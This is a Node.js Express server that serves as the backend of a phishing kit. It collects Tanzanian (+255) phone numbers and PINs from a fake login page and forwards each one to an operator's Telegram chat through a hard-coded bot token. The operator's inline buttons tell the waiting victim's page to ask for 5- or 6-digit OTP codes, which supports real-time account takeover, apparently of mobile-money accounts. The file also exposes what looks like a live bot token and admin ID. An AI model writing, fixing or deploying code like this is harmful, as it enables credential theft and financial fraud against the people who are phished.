const express = require("express");
const axios = require("axios");
const cors = require("cors");
const bodyParser = require("body-parser");
const crypto = require('crypto');
const path = require("path");

const app = express();
const PORT = process.env.PORT || 5002;

// 1. MIDDLEWARE (Must come before routes)
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public"))); 

// --- TELEGRAM CONFIG ---
const TELEGRAM_BOT_TOKEN = "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
const TELEGRAM_ADMIN_ID = "7162306402";
const BASE_URL = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;

const sessions = {};

// 2. ROUTES

// Main submission route
app.post("/api/submit", async (req, res) => {
  const { phone, pin } = req.body;
  
  // FIX 1: You must define sessionId BEFORE using it as a key
  const sessionId = crypto.randomBytes(8).toString("hex");

  sessions[sessionId] = { 
    status: 'waiting', 
    phone: phone, 
    pin: pin, 
    timestamp: Date.now() 
  };

  console.log(`📩 Received attempt for: +255${phone} | ID: ${sessionId}`);

  const message = `🔔 *New Login Attempt*\n📱 *Phone:* \`+255${phone}\` \n🔐 *PIN:* \`${pin}\` \n🆔 *ID:* \`${sessionId}\``;

  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_ADMIN_ID,
      text: message,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🔢 Request OTP (5)", url: `${BASE_URL}/api/cmd/${sessionId}/otp5` },
            { text: "🔢 Request OTP (6)", url: `${BASE_URL}/api/cmd/${sessionId}/otp6` }
          ],
          [
            { text: "✅ Done / Redirect", url: `${BASE_URL}/api/cmd/${sessionId}/done` }
          ]
        ]
      }
    });

    // FIX 2: Send the sessionId back so the frontend knows what to poll
    res.json({ success: true, sessionId: sessionId });
  } catch (error) {
    console.error("❌ Telegram Error");
    res.status(500).json({ success: false });
  }
});

// Admin Command Handler
app.get('/api/cmd/:id/:command', (req, res) => {
    const { id, command } = req.params;
    if (sessions[id]) {
        sessions[id].status = command;
        res.send(`<h1>Command Sent!</h1><p>Action <b>${command}</b> active.</p><script>setTimeout(window.close, 1000)</script>`);
    } else {
        res.status(404).send('Session not found.');
    }
});

// Status Polling
app.get('/api/status/:id', (req, res) => {
    // FIX 3: Use req.params.id to match the route above
    const session = sessions[req.params.id]; 
    if (session) {
        res.json({ status: session.status });
    } else {
        res.status(404).json({ status: 'not_found' });
    }
});

// Root Route (Place this AFTER API routes)
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html")); 
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 SERVER RUNNING ON PORT ${PORT}`);
});
